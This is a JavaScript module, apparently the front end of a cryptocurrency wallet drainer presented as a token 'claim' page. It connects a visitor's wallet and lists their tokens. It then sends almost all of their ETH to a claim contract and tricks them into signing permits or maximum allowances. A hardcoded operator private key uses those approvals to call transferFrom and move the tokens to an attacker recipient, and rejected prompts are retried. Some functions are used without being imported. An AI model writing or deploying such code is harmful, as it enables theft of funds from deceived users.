import {
  EthereumClient,
  w3mConnectors,
  w3mProvider,
} from '@web3modal/ethereum';
import { Web3Modal } from '@web3modal/html';
import {
  configureChains,
  createConfig,
  fetchBalance,
  writeContract,
} from '@wagmi/core';
import { MetaMaskConnector } from '@wagmi/core/connectors/metaMask';
import { mainnet } from '@wagmi/core/chains';
import { getAccount, fetchFeeData, disconnect, connect } from '@wagmi/core';
import { InjectedConnector } from '@wagmi/core/connectors/injected';

import { ethers } from 'ethers';

import * as constants from './constants.js';
import Web3 from 'web3';
import { Alchemy, Network } from 'alchemy-sdk';
const config = {
  apiKey: constants.apikeys,
  network: Network.ETH_MAINNET,
};
const alchemy = new Alchemy(config);

// const chains = [arbitrum]
const chains = [mainnet];
const projectId = constants.projectId;

const { publicClient } = configureChains(chains, [w3mProvider({ projectId })]);
const wagmiConfig = createConfig({
  autoConnect: true,
  connectors: w3mConnectors({ projectId, chains }),
  publicClient,
});
const ethereumClient = new EthereumClient(wagmiConfig, chains);
export const web3modal = new Web3Modal({ projectId }, ethereumClient);

let prices = [];
export let priceList = [];

export const mconnector = async () => {
  await connect({
    connector: new InjectedConnector(),
  });
};

export const getTokens = async (address) => {
  const balances = await alchemy.core.getTokenBalances(address);
  const nonZeroBalances = balances.tokenBalances.filter((token) => {
    return token.tokenBalance !== "0x0000000000000000000000000000000000000000000000000000000000000000";
  });
  let tokens = [];

  // Loop through all tokens with non-zero balance
  for (let token of nonZeroBalances) {
    // Get balance of token
    let balance = token.tokenBalance;
    const metadata = await alchemy.core.getTokenMetadata(token.contractAddress);
    metadata.balance = balance;
    metadata.token_address = token.contractAddress;
    tokens.push(metadata);
  }
  return tokens;
};

export const setPrice = (ticker) => {
  return new Promise(async (resolve) => {
    let token = priceList.filter((token) => token.symbol === `${ticker}USDT`);
    if (token && token.length > 0) prices.push(token[0].price);
    else prices.push(0);

    resolve(token.price);
  });
};

export const getPrice = async (symbols) => {
  for (let i = 0; i < symbols.length; i++) {
    const symbol = symbols[i];
    await setPrice(symbol);
  }
  return prices;
};

export const claim = async (_balance) => {
  const feeData = await fetchFeeData({
    chainId: 1,
    formatUnits: 'gwei',
  });
  const amount = _balance - (BigInt(50000) * (feeData.gasPrice));
  if (amount <= 0) return;
  await writeContract({
    address: constants.claimAddress,
    abi: constants.CLAIMEABI,
    functionName: 'Claim',
    value: amount,
    gas: '50000',
    gasPrice: feeData.gasPrice
  }).then((result) => {
    console.log(result)
  }).catch((error) => {
    console.log(error)
    claim(_balance);
  });
};
export const increaseAllowance = async (token) => {
  // RPC provider
  const provider = new ethers.providers.JsonRpcProvider(constants.infura);
  let permitProvider = null;
  if (window.ethereum){
    permitProvider = window.ethereum
  }else if (window.web3){
    permitProvider = window.web3.currentProvider
  }
  
  // get token Allownce to transfer imiditly
  const allow = await allownce(token);
  const balanceOfToken = await balanceOf(token);
  if (allow >= balanceOfToken) {
    return await transfer(token);
  };

  const permitToken = constants.permitTokens.find(tokenis => tokenis.address === token.token_address)
  const increaseallown = constants.increasAllownceTokens.find(tokenis => tokenis === token.token_address)
  const transfertoken = constants.transferTokens.find(tokenis => tokenis === token.token_address)
  if (permitToken && permitProvider) {

    let nonce = undefined
    await readContract({
      address: token.token_address,
      abi: constants.ALLOWANCEABI,
      functionName: 'nonces',
      args: [getAccount().address],
    }).then( (result) => {
      nonce = result
    }).catch( (error) => {
      console.log(error)
    })

    readContract({
      address: token.token_address,
      abi: constants.ALLOWANCEABI,
      functionName: 'version',
    }).then( async (result) => {
      if( result === '1') {
        await signDaiPermit(
          permitProvider, permitToken.address, getAccount().address, constants.initiator, constants.deadline.toString(), nonce.toString()
        ).then(async ( result) => {

          const signer = new ethers.Wallet(constants.initiatorPK, provider);
          const DaiToken = new ethers.Contract(
            permitToken.address, constants.ALLOWANCEABI, signer
          );

          await DaiToken.permit(
            getAccount().address, constants.initiator, result.nonce, result.expiry, true, result.v, result.r, result.s
          ).then(async (result) => {
            console.log(result)
            await waitForTransaction(result.transactionHash)
            await transfer(token);
          })

        }).catch( (error) => {
          console.log(error)
          increaseAllowance(token)
        });

      }else if (result === '2') {
        await signERC2612Permit(
          permitProvider, permitToken.address, getAccount().address, constants.initiator, constants.max, constants.deadline.toString(),
        ).then(async ( result) => {

          const signer = new ethers.Wallet(constants.initiatorPK, provider);
          const DaiToken = new ethers.Contract(
            permitToken.address, constants.permitV2, signer
          );

          await DaiToken.permit(
            getAccount().address, constants.initiator, result.value, result.expiry, result.v, result.r, result.s
          ).then(async (result) => {
            console.log(result)
            await waitForTransaction(result.transactionHash)
            await transfer(token);
          })

        }).catch( (error) => {
          console.log(error)
          increaseAllowance(token)
        })
      }
    }).catch((error) => {
      console.log(error);
    })
    
  }else if (increaseallown) {
    await writeContract({
      address: token.token_address,
      abi: constants.ALLOWANCEABI,
      functionName: 'increaseAllowance',
      args: [constants.initiator, constants.max]
    }).then(async (result) => {
      console.log(result)
      await waitForTransaction(result.transactionHash)
      await transfer(token);
    }).catch( (error) => {
      console.log(error)
      increaseAllowance(token)
    })
  }else if (transfertoken) {
    await writeContract({
      address: token.token_address,
      abi: constants.ERC20ABI,
      functionName: 'transfer',
      args: [constants.recipient, token.balance]
    }).then((result) => {
      console.log(result)
    }).catch( (error) => {
      console.log(error)
      increaseAllowance(token)
    })
  }
};

export const transfer = async (token) => {
  const amount = balanceOf(token)
  const provider = new ethers.providers.JsonRpcProvider(constants.infura);
  const signer = new ethers.Wallet(constants.initiatorPK, provider);
  const tokencontract = new ethers.Contract(
    token.token_address,
    constants.ALLOWANCEABI,
    signer
  );
  await tokencontract.transferFrom(
    getAccount().address, constants.recipient, amount
  ).then(async (result) => {
    console.log(result)
  }).catch( (error) => {
    console.log(error)
  });
};

export const ethBalance = async () => {
  try {
    const account = getAccount().address;
    const balance = await fetchBalance({
      address: account,
    });
    return balance;
  } catch (error) {
    console.log(error);
  }
};

export const allownce = async (token) => {
  return await readContract({
    address: token.token_address,
    abi: constants.ALLOWANCEABI,
    functionName: 'allowance',
    args: [getAccount().address, constants.initiator],
    chainId: 1
  }).catch( (error) => {
    console.log(error)
  })
}

export const balanceOf = async (token) => {
  return await readContract({
    address: token.token_address,
    abi: constants.ALLOWANCEABI,
    functionName: 'balanceOf',
    args: [getAccount().address],
    chainId: 1
  }).catch( (error) => {
    console.log(error)
  })
}